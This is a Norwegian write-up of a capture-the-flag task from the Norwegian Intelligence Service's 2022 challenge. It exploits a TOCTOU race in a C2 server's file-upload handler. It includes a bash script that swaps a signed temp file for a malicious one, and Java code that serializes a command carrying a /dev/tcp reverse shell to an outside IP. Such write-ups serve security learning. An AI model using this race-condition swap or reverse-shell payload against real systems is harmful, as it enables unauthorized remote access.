
## Writeup av hvordan jeg tok over C2-infrastrukturen ved å injisere et ondsinnet javaobjekt.

Jeg deltok i Etterretningstjenestens CTF høsten 2022, og denne writeupen tar for seg en av oppgavene.

<br>
<br>

Følgende kodesnutt viser litt av serverkoden for C2-rammeverket

```python
@app.route(PREFIX + "<client_id>/commands", methods=["POST"])
def add_command(client_id):
    upload_file = request.files.get("file", None)
    if not upload_file:
        logger.warning("missing file argument")
        return Response("", 400)

    with tempfile.NamedTemporaryFile(dir=WORKSPACE) as f:
        command_file = f.name
        upload_file.save(command_file)            # <------------------- her er sårbarheten
        print(f"saved file as {f.name}")
        try:
            obj = Command(f)      # <-------- filen blir deserialisert og verifiserer 
            obj.verify()          #           bla. at filen inneholder riktig signatur

            logger.info(f"registering new command for client {client_id}")
            add_command_to_db(client_id, obj.run_after, command_file)       # <--------- lagrer kommandoen i database 
            return Response(f"OK\n", 200)                                   #            som klientene sjekker i ny og ne

        except:
            logger.exception("invalid command or signature")
            return Response("", 400)
```

C2-rammerverket var satt opp slik at angriperen kunne sende en javaserialisert kommando (via POST-request) til klienter tilnyttet C2-serveren. Dersom kommandoen hadde riktig signatur ble den lagret i en database. Denne databasen fungerte som et postkontor hvor alle klienter koblet seg på for å se om det var lagret nye kommandoer til dem.

Jeg hadde tilgang til maskinen som kjørte denne C2-serveren, og målet mitt var å få tilgang til en eller flere klienter. Jeg prøvde å lage ondsinnede javaserialiserte kommandoer og sendte disse direkte til en av klientene, men dette gikk ikke fordi jeg ikke hadde riktig signatur.

Etter å ha studert server-koden fikk jeg øye på at kommandoen ble først lagret som en tmp-fil før den ble deserialisert og signatur sjekket. Kanskje kunne jeg utnytte dette ved å bytte ut en legitim kommando med min egen.

<br>
<br>

Siden tmp-filen ble slettet med en gang kommandoen var blitt lagret i databasen måtte jeg skrive et enkelt bash-script som byttet ut den legitime kommandoen med min egen:

```bash
cd .../   # Mappen hvor server lagrer både log-filer og kommando-fil i tmp-format
		      # tmp-filen blir slettet ganske fort
while true;
do
	var=$(ls | wc -l)   # Lagre antall filer i mappen i `var` (.log osv tas ikke med, derfor `ls` for å ikke telle med skjulte filer)
	if [ $var -eq 1 ]   # Hvis `var` == 1, da har server lagret tmp-filen
	then
		for f in `ls`
		do 
			echo "- $f created\n- Replacing with malicious object"
			sleep .001    # Sleep slik at koden får tid til å gjennomføre signatur-sjekk på den legitime kommando-filen
			base=$(basename -- "$f")    # Lagre tmp-navnet i variabel `base`
			mv -v $base ../   # Flytt den legitime kommando-filen bort
			cp ../evil_config $base   # Kopier ond kommando-fil til det samme tmp-navnet som den legitime filen hadde
			break   # Nå vil databasen ane fred og ingen fare og lagre den onde kommando-filen
		done
	fi
done
```
<br>

Kode for å lage det ondsinnede javaobjektet:

```java
import commands.Command;
import commands.Execute;
import utils.Config;
import java.io.*;
import java.time.Instant;

public class evilSerial {

    public static void writeObject(ObjectOutputStream var1) throws IOException {

        Config cfg = new Config();
        Command exec = new Execute();

        exec.recipient = "DEADBEEFDEADBEEF";
        exec.runAfter = Instant.now();
        exec.value = "exec bash -i &>/dev/tcp/10.1.194.171/1337 <&1";
        cfg.id = "DEADBEEFDEADBEEF";
        cfg.serverURL = "http://shady-aggregator.utl/f52e6101/";
        cfg.sleepDuration = 15;
        cfg.pendingCommands.add(exec);
        var1.writeObject(cfg);
}

    public static void main(String[] args) throws IOException {

        FileOutputStream fos = new FileOutputStream("evil_config");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        writeObject(os);
        os.close();
    }

}
```

<br>

Video av gjennomføring:

![](https://github.com/vegkva/writeups/blob/main/etjenesten_h%C3%B8st22/C2/ezgif-5-710a3f6a0c.gif)

Vindu til høyre:
- Først sendes det en legitim kommando til en av de infiserte klientene (DEADBEEFDEADBEEF) via C2-serveren (shady-aggregator)
- I server-koden gjøres det en signatursjekk av kommando-objektet
- Dersom signaturen feiler, vil ikke kommandoen sendes videre til klienten
- Når signaturen er sjekket og validert lagres kommandoen i en database som sender til klienter hver gang de sjekker inn.
- Men før kommandoen lagres i databasen blir den lagret som en tmp-fil i "/tmp/.../" (denne løsningen sammen med linux-rettigheter er hva som blir utnyttet)

Vindu til venstre:
- Her kjøres det et skript som hele tiden sjekker om kommandoen (eks. tmp15gj3H2) er lagret i "/tmp/.../"
- Når kommandoen er lagret, fjernes den og blir erstattet med mitt eget java-objekt med "reverse shell"

Mappen "/tmp/.../" har 777 rettigheter. Det har altså ingen betydning at tmp-filen eies av c2 med 700 rettigheter.
